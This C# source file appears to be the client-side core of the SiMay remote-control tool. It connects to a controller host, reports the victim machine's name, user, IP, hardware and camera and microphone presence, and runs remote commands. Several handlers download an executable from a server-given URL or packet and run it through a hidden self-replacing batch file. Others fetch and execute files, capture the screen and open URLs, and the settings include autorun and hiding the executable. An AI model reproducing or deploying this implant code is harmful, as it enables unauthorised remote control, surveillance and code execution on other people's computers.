using SiMay.Core;
using System;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using SiMay.Basic;
using System.Net;
using System.IO;
using SiMay.ServiceCore.Attributes;
using System.Drawing;
using SiMay.RemoteService.Loader;
using SiMay.ModelBinder;
using SiMay.Platform.Windows.Helper;
using SiMay.Net.SessionProvider;
using SiMay.Sockets.Tcp;
using SiMay.Net.SessionProvider.Providers;

namespace SiMay.ServiceCore
{
    public class MainApplicationService : ApplicationProtocolService, IAppMainService
    {
        /// <summary>
        /// 正常
        /// </summary>
        private const int STATE_NORMAL = 1;

        /// <summary>
        /// 断开
        /// </summary>
        private const int STATE_DISCONNECT = 0;


        private int _keepStateSign = STATE_DISCONNECT;//主连接状态

        private ServiceTaskQueue _taskQueue = new ServiceTaskQueue();

        /// <summary>
        /// 启动参数
        /// </summary>
        public StartParameter StartParameter { get; set; }

        /// <summary>
        /// 会话提供
        /// </summary>
        public SessionProvider SessionProvider { get; set; }

        /// <summary>
        /// 远程服务器地址
        /// </summary>
        public IPEndPoint RemoteIPEndPoint { get; set; }

        /// <summary>
        /// 启动主服务
        /// </summary>
        /// <param name="startParameter"></param>
        /// <param name="clientAgent"></param>
        /// <param name="session"></param>
        /// <param name="serviceIPEndPoint"></param>
        public void StartService(SessionProviderContext session)
        {
            _keepStateSign = STATE_NORMAL;//主连接状态

            this.SetSession(session);

            session.AppTokens = new object[2]
            {
                SessionKind.MAIN_SERVICE,
                null
            };

            AppConfiguartion.HostAddress = StartParameter.Host;
            AppConfiguartion.HostPort = StartParameter.Port;
            AppConfiguartion.AccessKey = StartParameter.AccessKey;
            AppConfiguartion.DefaultRemarkInfo = StartParameter.RemarkInformation;
            AppConfiguartion.DefaultGroupName = StartParameter.GroupName;
            AppConfiguartion.IsAutoRun = StartParameter.IsAutoStart;
            AppConfiguartion.IsHideExcutingFile = StartParameter.IsHide;
            AppConfiguartion.RunTime = StartParameter.RunTimeText;
            AppConfiguartion.Version = StartParameter.ServiceVersion;
            AppConfiguartion.MiddleServiceMode = StartParameter.SessionMode == 1 ? true : false;
            AppConfiguartion.IdentifyId = StartParameter.UniqueId;
            AppConfiguartion.ServerIPEndPoint = RemoteIPEndPoint;
            AppConfiguartion.ServiceDisplayName = StartParameter.ServiceDisplayName;
            AppConfiguartion.ServiceName = StartParameter.ServiceName;
            AppConfiguartion.SystemPermission = StartParameter.SystemPermission;
        }

        private void ConnectToServer()
        {
            //尝试解析出最新的域名地址
            ThreadHelper.ThreadPoolStart(c =>
            {
                var ip = HostHelper.GetHostByName(AppConfiguartion.HostAddress);
                if (ip.IsNullOrEmpty())
                    return;
                AppConfiguartion.ServerIPEndPoint = new IPEndPoint(IPAddress.Parse(ip), AppConfiguartion.HostPort);
            });
            SessionProvider
                .ConvertTo<TcpClientSessionProvider>()
                .ConnectAsync(AppConfiguartion.ServerIPEndPoint);
        }

        /// <summary>
        /// 发送确认包
        /// 作用：连接确认，以便服务端识别这是一个有效的工作连接，type = 中间服务器识别 ， accessId = 发起创建应用服务请求的主控端标识
        /// </summary>
        /// <param name="session"></param>
        private void SendACK(SessionProviderContext session, SessionKind type, long accessId)
        {
            session.SendTo(MessageHead.C_GLOBAL_CONNECT,
                new AcknowledPacket()
                {
                    AccessId = accessId,//当前主控端标识
                    AccessKey = AppConfiguartion.AccessKey,
                    Type = (byte)type,
                    AssemblyLoad = true
                });
        }

        /// <summary>
        /// 通信库主消息处理函数
        /// </summary>
        /// <param name="notify"></param>
        /// <param name="session"></param>
        public void Notify(TcpSessionNotify notify, SessionProviderContext session)
        {
            try
            {
                switch (notify)
                {
                    case TcpSessionNotify.OnConnected:
                        this.ConnectedHandler(session, notify);
                        break;
                    case TcpSessionNotify.OnDataReceiveing:
                        break;
                    case TcpSessionNotify.OnDataReceived:
                        var workType = (SessionKind)session.AppTokens[0];
                        if (workType == SessionKind.MAIN_SERVICE)
                            this.HandlerBinder.InvokePacketHandler(session, session.GetMessageHead(), this);
                        else if (workType == SessionKind.APP_SERVICE)
                        {
                            var appService = ((ApplicationRemoteService)session.AppTokens[1]);
                            appService.HandlerBinder.InvokePacketHandler(session, session.GetMessageHead(), appService);
                        }
                        break;
                    case TcpSessionNotify.OnClosed:
                        this.CloseHandler(session, notify);
                        break;
                }
            }
            catch (Exception ex)
            {
                StringBuilder sb = new StringBuilder();
                sb.Append(ex.Message);
                sb.Append(ex.StackTrace);
                LogHelper.WriteErrorByCurrentMethod(sb.ToString());

                Console.WriteLine(ex.Message);
            }

        }

        /// <summary>
        /// 连接初始化
        /// 
        /// 作用：分配工作类型
        /// </summary>
        /// <param name="session"></param>
        /// <param name="notify"></param>
        private void ConnectedHandler(SessionProviderContext session, TcpSessionNotify notify)
        {
            //当服务主连接离线或未连接，优先与session关联
            if (Interlocked.Exchange(ref _keepStateSign, STATE_NORMAL) == STATE_DISCONNECT)
            {
                session.AppTokens = new object[2]
                {
                    SessionKind.MAIN_SERVICE,
                    null
                };
                this.SetSession(session);
                //服务主连接accessId保留
                this.SendACK(session, SessionKind.MAIN_SERVICE, 0);
            }
            else
            {
                ApplicationRemoteService service = _taskQueue.Dequeue();
                if (service.IsNull())
                {
                    //找不到服务。。
                    session.SessionClose(false);
                    return;
                }
                session.AppTokens = new object[2]
                {
                    SessionKind.APP_SERVICE,
                    service
                };
                service.SetSession(session);

                this.SendACK(session, SessionKind.APP_SERVICE, service.AccessId);
            }

        }
        private void CloseHandler(SessionProviderContext session, TcpSessionNotify notify)
        {
            if (_keepStateSign == STATE_DISCONNECT && session.AppTokens.IsNull())
            {
                //服务主连接断开或未连接
                session.AppTokens = new object[2]
                {
                    SessionKind.MAIN_SERVICE,
                    null
                };
            }
            else if (_keepStateSign == STATE_NORMAL && session.AppTokens.IsNull())//task连接，连接服务器失败
            {
                _taskQueue.Dequeue();
                return;//不重试连接，因为可能会连接不上，导致频繁重试连接
            }

            var workType = (SessionKind)session.AppTokens[0];
            if (workType == SessionKind.MAIN_SERVICE)
            {
                //清除主连接会话信息
                this.SetSession(null);
                Interlocked.Exchange(ref _keepStateSign, STATE_DISCONNECT);

                var timer = new System.Timers.Timer();
                timer.Interval = 5000;
                timer.Elapsed += (s, e) =>
                {
                    //主连接重连
                    ConnectToServer();

                    timer.Stop();
                    timer.Dispose();
                };
                timer.Start();
            }
            else if (workType == SessionKind.APP_SERVICE)
            {
                var appService = ((ApplicationRemoteService)session.AppTokens[1]);
                if (appService.WhetherClosed)
                    return;
                appService.WhetherClosed = true;
                appService.SessionClosed();
            }
        }

        /// <summary>
        /// 将服务加入到等待队列并发起工作连接
        /// </summary>
        /// <param name="service"></param>
        private void PostWorkServiceToAwaitQueue(ApplicationRemoteService service)
        {
            this._taskQueue.Enqueue(service);
            this.ConnectToServer();
        }

        [PacketHandler(MessageHead.S_MAIN_ACTIVATE_APPLICATION_SERVICE)]
        private void ActivateApplicationService(SessionProviderContext session)
        {
            var activateServicePack = session.GetMessageEntity<ActivateServicePack>();
            string applicationKey = activateServicePack.CommandText.Split('.').Last<string>();

            //获取当前消息发送源主控端标识
            long accessId = session.GetAccessId();
            var context = SysUtil.ServiceTypes.FirstOrDefault(x => x.ServiceKey.Equals(applicationKey));
            if (!context.IsNull())
            {
                var serviceName = context.ApplicationServiceType.GetCustomAttribute<ServiceNameAttribute>(true);
                SystemMessageNotify.ShowTip($"正在进行远程操作:{(serviceName.IsNull() ? context.ServiceKey : serviceName.Name) }");
                var applicationService = Activator.CreateInstance(context.ApplicationServiceType, null) as ApplicationRemoteService;
                applicationService.ApplicationKey = context.ServiceKey;
                applicationService.ActivatedCommandText = activateServicePack.CommandText;
                applicationService.AccessId = accessId;
                this.PostWorkServiceToAwaitQueue(applicationService);
            }
        }

        [PacketHandler(MessageHead.S_MAIN_REMARK)]
        private void SetDesInfo(SessionProviderContext session)
        {
            var des = session.GetMessage().ToUnicodeString();
            AppConfiguartion.RemarkInfomation = des;
        }

        [PacketHandler(MessageHead.S_MAIN_GROUP)]
        private void SetGroupName(SessionProviderContext session)
        {
            var groupName = session.GetMessage().ToUnicodeString();
            AppConfiguartion.GroupName = groupName;
        }

        [PacketHandler(MessageHead.S_MAIN_SESSION)]
        private void SetSystemSession(SessionProviderContext session)
            => SystemHelper.SetSessionStatus(session.GetMessage()[0]);


        [PacketHandler(MessageHead.S_MAIN_RELOADER)]
        private void ReLoader(SessionProviderContext session)
            => Application.Restart();


        [PacketHandler(MessageHead.S_MAIN_UPDATE)]
        private void UpdateService(SessionProviderContext session)
        {
            try
            {
                var pack = session.GetMessageEntity<RemoteUpdatePacket>();

                string tempFile = this.GetTempFilePath(".exe");
                if (pack.UrlOrFileUpdate == RemoteUpdateType.File)
                {
                    using (var stream = File.Open(tempFile, FileMode.Create, FileAccess.Write))
                    {
                        stream.Seek(0, SeekOrigin.Begin);
                        stream.Write(pack.FileDate, 0, pack.FileDate.Length);
                    }
                }
                else if (pack.UrlOrFileUpdate == RemoteUpdateType.Url)
                {
                    using (WebClient c = new WebClient())
                    {
                        c.Proxy = null;
                        c.DownloadFile(pack.DownloadUrl, tempFile);
                    }
                }

                if (File.Exists(tempFile) && new FileInfo(tempFile).Length > 0)
                {
                    var batchFile = CreateBatch(Application.ExecutablePath, tempFile);
                    if (!batchFile.IsNullOrEmpty())
                    {
                        ProcessStartInfo startInfo = new ProcessStartInfo
                        {
                            WindowStyle = ProcessWindowStyle.Hidden,
                            UseShellExecute = true,
                            FileName = batchFile
                        };
                        Process.Start(startInfo);

                        Environment.Exit(0);//退出程序
                    }
                    else
                    {
                        LogHelper.WriteErrorByCurrentMethod("远程更新失败，更新脚本创建失败!");
                    }
                }
                else
                {
                    LogHelper.WriteErrorByCurrentMethod("远程更新失败，服务端文件不存在!");
                }
            }
            catch (Exception ex)
            {
                LogHelper.WriteErrorByCurrentMethod(ex);
            }

            string CreateBatch(string currentFilePath, string newFilePath)
            {
                try
                {
                    string tempFilePath = this.GetTempFilePath(".bat");

                    string updateBatch =
                        "@echo off" + "\r\n" +
                        "chcp 65001" + "\r\n" +
                        "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                        "ping -n 10 localhost > nul" + "\r\n" +
                        "del /a /q /f " + "\"" + currentFilePath + "\"" + "\r\n" +
                        "move /y " + "\"" + newFilePath + "\"" + " " + "\"" + currentFilePath + "\"" + "\r\n" +
                        "start \"\" " + "\"" + currentFilePath + "\"" + "\r\n" +
                        "del /a /q /f " + "\"" + tempFilePath + "\"";

                    File.WriteAllText(tempFilePath, updateBatch, new UTF8Encoding(false));
                    return tempFilePath;
                }
                catch (Exception)
                {
                    return string.Empty;
                }
            }
        }

        private string GetTempFilePath(string extension)
        {
            string tempFilePath;
            do
            {
                tempFilePath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + extension);
            } while (File.Exists(tempFilePath));

            return tempFilePath;
        }

        [PacketHandler(MessageHead.S_MAIN_HTTPDOWNLOAD)]
        private void HttpDownloadExecute(SessionProviderContext session)
            => AppDownloaderHelper.DownloadFile(session.GetMessage());


        [PacketHandler(MessageHead.S_MAIN_OPEN_WEBURL)]
        private void OpenUrl(SessionProviderContext session)
        {
            try
            {
                Process.Start(session.GetMessage().ToUnicodeString());
            }
            catch { }
        }

        //[PacketHandler(MessageHead.S_MAIN_CREATE_DESKTOPVIEW)]
        //private void CreateDesktopView(SessionProviderContext session)
        //{
        //    //var isConstraint = GetMessage(session)[0];
        //    AppConfiguartion.IsOpenScreenView = true;
        //    //if (!_screenViewIsAction || isConstraint == 0)
        //    this.OnRemoteCreateDesktopView();
        //}

        /// <summary>
        /// 发送桌面下一帧
        /// </summary>
        /// <param name="session"></param>
        [PacketHandler(MessageHead.S_MAIN_DESKTOPVIEW_GETFRAME)]
        private void SendNextFrameDesktopView(SessionProviderContext session)
        {
            //ThreadHelper.ThreadPoolStart(c =>
            //{
            //var args = c.ConvertTo<object[]>();
            //var accessId = args[0].ConvertTo<long>();
            var getView = session.GetMessageEntity<DesktopViewGetFramePacket>();
            if (getView.Width == 0 || getView.Height == 0 /*|| get.TimeSpan == 0 || get.TimeSpan < 50*/)
                return;

            //Thread.SetData(Thread.GetNamedDataSlot("AccessId"), accessId);

            //Thread.Sleep(get.TimeSpan);

            session.SendTo(MessageHead.C_MAIN_DESKTOPVIEW_FRAME,
                    new DesktopViewFramePack()
                    {
                        //InVisbleArea = get.InVisbleArea,
                        ViewData = ImageExtensionHelper.CaptureNoCursorToBytes(new Size(getView.Width, getView.Height))
                    });

            //session.SendTo(SysMessageConstructionHelper.WrapAccessId(data, accessId));
            //}, new object[] { GetAccessId(session), session.GetMessageEntity<DesktopViewGetFramePack>() });
        }
        //[PacketHandler(MessageHead.S_MAIN_DESKTOPVIEW_CLOSE)]
        //private void CloseDesktopView(SessionProviderContext session)
        //    => AppConfiguartion.IsOpenScreenView = false;

        //[PacketHandler(MessageHead.S_MAIN_DESKTOPRECORD_OPEN)]
        //private void StartDesktopRecord(SessionProviderContext session)
        //{
        //    var getframe = session.GetMessageEntity<DesktopRecordGetFramePack>();
        //    _screen_record_height = getframe.Height;
        //    _screen_record_width = getframe.Width;
        //    _screen_record_spantime = getframe.TimeSpan;

        //    if (_screen_record_height <= 0 || _screen_record_width <= 0 || _screen_record_spantime < 500)
        //        return;

        //    AppConfiguartion.ScreenRecordHeight = _screen_record_height;
        //    AppConfiguartion.ScreenRecordWidth = _screen_record_width;
        //    AppConfiguartion.ScreenRecordSpanTime = _screen_record_spantime;
        //    AppConfiguartion.IsScreenRecord = true;

        //    //主机名称作为目录名
        //    session.SendTo(MessageHead.C_MAIN_DESKTOPRECORD_OPEN, Environment.MachineName);
        //}
        //[PacketHandler(MessageHead.S_MAIN_DESKTOPRECORD_CLOSE)]
        //private void DesktopRecordClose(SessionProviderContext session)
        //    => AppConfiguartion.IsScreenRecord = false;

        ///// <summary>
        ///// 远程创建屏幕墙屏幕视图
        ///// </summary>
        //private void OnRemoteCreateDesktopView()
        //{
        //    //创建屏幕
        //    string RemarkName = AppConfiguartion.RemarkInfomation ?? AppConfiguartion.DefaultRemarkInfo;

        //    SendTo(CurrentSession, MessageHead.C_MAIN_DESKTOPVIEW_CREATE,
        //        new DesktopViewDescribePack()
        //        {
        //            MachineName = Environment.MachineName,
        //            RemarkInformation = RemarkName
        //        });
        //}



        /// <summary>
        /// 发送下一帧屏幕记录
        /// </summary>
        /// <param name="width"></param>
        /// <param name="height"></param>
        //[PacketHandler(MessageHead.S_MAIN_DESKTOPRECORD_GETFRAME)]
        //private void SendNextDesktopRecordFrame(SessionProviderContext session)
        //{

        //    ThreadPool.QueueUserWorkItem((o) =>
        //    {
        //        if (_screen_record_width == 0 || _screen_record_height == 0)
        //            return;

        //        Thread.Sleep(_screen_record_spantime);

        //        session.SendTo(MessageHead.C_MAIN_DESKTOPRECORD_FRAME, ImageExtensionHelper.CaptureNoCursorToBytes(new Size(_screen_record_width, _screen_record_height)));
        //    });
        //}

        [PacketHandler(MessageHead.S_MAIN_MESSAGEBOX)]
        private void ShowMessageBox(SessionProviderContext session)
        {
            var msg = session.GetMessageEntity<MessagePacket>();
            ThreadHelper.CreateThread(() =>
            {
                string title = msg.MessageTitle;
                string cont = msg.MessageBody;

                switch ((MessageIconKind)msg.MessageIcon)
                {
                    case MessageIconKind.Error:
                        MessageBox.Show(cont, title, 0, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
                        break;

                    case MessageIconKind.Question:
                        MessageBox.Show(cont, title, 0, MessageBoxIcon.Question, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
                        break;

                    case MessageIconKind.InforMation:
                        MessageBox.Show(cont, title, 0, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
                        break;

                    case MessageIconKind.Exclaim:
                        MessageBox.Show(cont, title, 0, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
                        break;
                }
            }, true);
        }
        /// <summary>
        /// 发送上线包
        /// </summary>
        [PacketHandler(MessageHead.S_GLOBAL_OK)]
        private void SendLoginPack(SessionProviderContext session)
        {
            var loginResult = GatherLoginPacketBuilder();
            session.SendTo(MessageHead.C_MAIN_LOGIN, loginResult);
        }

        private LoginPacket GatherLoginPacketBuilder(bool assemblyLoadCompleted = false)
        {
            string remarkInfomation = AppConfiguartion.RemarkInfomation ?? AppConfiguartion.DefaultRemarkInfo;
            string groupName = AppConfiguartion.GroupName ?? AppConfiguartion.DefaultGroupName;
            bool openScreenView = AppConfiguartion.IsOpenScreenView;//默认为打开屏幕墙

            var loginPack = new LoginPacket();
            loginPack.IPV4 = GetSystemInforHelper.GetLocalIPv4();
            loginPack.MachineName = Environment.MachineName ?? string.Empty;
            loginPack.Remark = remarkInfomation;
            loginPack.ProcessorCount = Environment.ProcessorCount;
            loginPack.ProcessorInfo = GetSystemInforHelper.GetMyCpuInfo;
            loginPack.MemorySize = GetSystemInforHelper.GetMyMemorySize;
            loginPack.StartRunTime = AppConfiguartion.RunTime;
            loginPack.ServiceVison = AppConfiguartion.Version;
            loginPack.UserName = Environment.UserName.ToString();
            loginPack.OSVersion = GetSystemInforHelper.GetOSFullName;
            loginPack.GroupName = groupName;
            loginPack.OpenScreenView = openScreenView;
            loginPack.ExistCameraDevice = GetSystemInforHelper.ExistCameraDevice();
            loginPack.ExitsRecordDevice = GetSystemInforHelper.ExistRecordDevice();
            loginPack.ExitsPlayerDevice = GetSystemInforHelper.ExistPlayDevice();
            loginPack.IdentifyId = AppConfiguartion.IdentifyId;
            loginPack.InitialAssemblyLoad = assemblyLoadCompleted;

            return loginPack;
        }
    }
}